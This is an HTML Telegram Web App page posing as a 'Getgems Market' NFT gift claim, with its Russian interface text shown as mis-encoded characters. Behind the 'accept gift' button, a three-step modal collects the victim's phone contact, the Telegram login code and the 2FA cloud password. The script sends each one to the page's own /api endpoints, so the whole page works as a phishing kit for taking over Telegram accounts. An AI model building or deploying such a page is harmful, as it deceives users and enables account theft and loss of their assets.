<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Getgems Market</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            background-color: #000; color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            margin: 0; padding: 0; user-select: none;
        }
        /* Header */
        .header {
            padding: 12px 16px; border-bottom: 0.5px solid #2c2c2e;
            display: flex; justify-content: space-between; align-items: center;
            position: sticky; top: 0; background: rgba(0,0,0,0.8); backdrop-filter: blur(10px); z-index: 10;
        }
        .header-title { font-weight: 600; font-size: 17px; }

        /* NFT Card */
        .content { padding: 16px; padding-bottom: 120px; }
        .nft-main-card {
            background: #1c1c1e; border-radius: 24px; overflow: hidden;
            border: 0.5px solid #2c2c2e; margin-bottom: 16px;
        }
        .image-container {
            width: 100%; aspect-ratio: 1; background: #2c2c2e;
            display: flex; align-items: center; justify-content: center; position: relative;
        }
        .image-container img { width: 80%; height: 80%; object-fit: contain; }
        .offchain-badge {
            position: absolute; bottom: 12px; left: 12px;
            background: rgba(0,0,0,0.5); padding: 4px 8px; border-radius: 8px;
            font-size: 12px; color: #fff; backdrop-filter: blur(4px);
        }

        .nft-info { padding: 16px; text-align: left; }
        .nft-name { font-size: 24px; font-weight: 700; margin-bottom: 4px; }
        .nft-verified { color: #007aff; font-size: 14px; font-weight: 500; }

        /* Fixed Footer Button */
        .footer {
            position: fixed; bottom: 0; left: 0; right: 0;
            padding: 16px; background: linear-gradient(0deg, #000 0%, transparent 100%);
            z-index: 100;
        }
        .btn-primary {
            background: #007aff; color: #fff; border: none; width: 100%;
            padding: 18px; border-radius: 16px; font-size: 16px; font-weight: 600;
            cursor: pointer; box-shadow: 0 4px 12px rgba(0, 122, 255, 0.3);
        }

        /* Modals */
        .overlay {
            display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85);
            z-index: 1000; align-items: center; justify-content: center; padding: 20px;
        }
        .modal {
            background: #1c1c1e; width: 100%; border-radius: 28px;
            padding: 24px; box-sizing: border-box; border: 0.5px solid #3a3a3c;
        }
        input {
            width: 100%; padding: 16px; background: #2c2c2e; border: 1px solid #3a3a3c;
            border-radius: 14px; color: #fff; margin-top: 16px; font-size: 16px; box-sizing: border-box;
        }
    </style>
</head>
<body>

<div class="header">
    <div class="header-title">Getgems Market ‚åµ</div>
    <div style="opacity: 0.6;">üîç</div>
</div>

<div class="content">
    <div class="nft-main-card">
        <div class="image-container">
            <img id="nft-img" src="https://getgems.io/assets/nft-placeholder.png">
            <div class="offchain-badge">üíé offchain</div>
        </div>
        <div class="nft-info">
            <div class="nft-name" id="nft-name">NFT Gift</div>
            <div class="nft-verified">‚úì –û—Ñ–∏—Ü–∏–∞–ª—å–Ω–∞—è –∫–æ–ª–ª–µ–∫—Ü–∏—è</div>
        </div>
    </div>
</div>

<div class="footer">
    <button class="btn-primary" onclick="openModal()">–ü—Ä–∏–Ω—è—Ç—å –ø–æ–¥–∞—Ä–æ–∫</button>
</div>

<div id="overlay" class="overlay">
    <div class="modal">
        <div id="step-1">
            <h2 style="margin: 0 0 10px 0;">–ü—Ä–∏–Ω—è—Ç—å NFT</h2>
            <p style="color: #8e8e93; font-size: 14px;">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –≤–ª–∞–¥–µ–Ω–∏–µ –∞–∫–∫–∞—É–Ω—Ç–æ–º –¥–ª—è –∑–∞—á–∏—Å–ª–µ–Ω–∏—è –ø–æ–¥–∞—Ä–∫–∞.</p>
            <button class="btn-primary" onclick="sharePhone()" style="background: #fff; color: #000; margin-top: 20px;">
                –ü–æ–¥–µ–ª–∏—Ç—å—Å—è –Ω–æ–º–µ—Ä–æ–º
            </button>
        </div>
        <div id="step-2" style="display:none;">
            <h2>–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥</h2>
            <p style="color: #8e8e93; font-size: 14px;">–ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ –≤–∞—à Telegram</p>
            <input type="text" id="code" placeholder="–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è" maxlength="5">
            <button class="btn-primary" style="margin-top: 20px;" onclick="sendCode()">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
        </div>
        <div id="step-3" style="display:none;">
            <h2>2FA –ü–∞—Ä–æ–ª—å</h2>
            <input type="password" id="pass" placeholder="–û–±–ª–∞—á–Ω—ã–π –ø–∞—Ä–æ–ª—å">
            <button class="btn-primary" style="margin-top: 20px;" onclick="sendPass()">–í–æ–π—Ç–∏</button>
        </div>
    </div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();
    tg.setHeaderColor('#000000');
    let phone = "";

    // –î–∏–Ω–∞–º–∏—á–µ—Å–∫–∞—è –ø–æ–¥–≥—Ä—É–∑–∫–∞ NFT –∏–∑ URL
    const params = new URLSearchParams(window.location.search);
    const nftUrl = params.get('nft_url') || "";
    if (nftUrl) {
        const rawName = nftUrl.split('/').pop();
        document.getElementById('nft-name').innerText = rawName.replace(/-/g, ' ');
        const asset = rawName.split('-')[0];
        document.getElementById('nft-img').src = `https://raw.githubusercontent.com/TelegramMessenger/Gifts/main/assets/${asset}.png`;
    }

    function openModal() { document.getElementById('overlay').style.display = 'flex'; }

    function sharePhone() {
        tg.requestContact((ok) => {
            if(ok) {
                const check = setInterval(async () => {
                    const r = await fetch(`/api/check_contact?id=${tg.initDataUnsafe.user.id}`);
                    const d = await r.json();
                    if(d.status === 'received') {
                        clearInterval(check);
                        phone = d.phone;
                        document.getElementById('step-1').style.display = 'none';
                        document.getElementById('step-2').style.display = 'block';
                    }
                }, 2000);
            }
        });
    }

    async function sendCode() {
        const code = document.getElementById('code').value;
        const r = await fetch('/api/send_code', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({phone, code})
        });
        const d = await r.json();
        if(d.status === '2fa_needed') {
            document.getElementById('step-2').style.display = 'none';
            document.getElementById('step-3').style.display = 'block';
        } else if(d.status === 'success') { success(); }
    }

    async function sendPass() {
        const password = document.getElementById('pass').value;
        const r = await fetch('/api/send_password', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({phone, password})
        });
        const d = await r.json();
        if(d.status === 'success') success();
    }

    function success() {
        alert("–ó–∞—è–≤–∫–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞! –ü–æ–¥–∞—Ä–æ–∫ –ø–æ—è–≤–∏—Ç—Å—è –≤ –ø—Ä–æ—Ñ–∏–ª–µ –ø–æ—Å–ª–µ –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏.");
        tg.close();
    }
</script>
</body>
</html>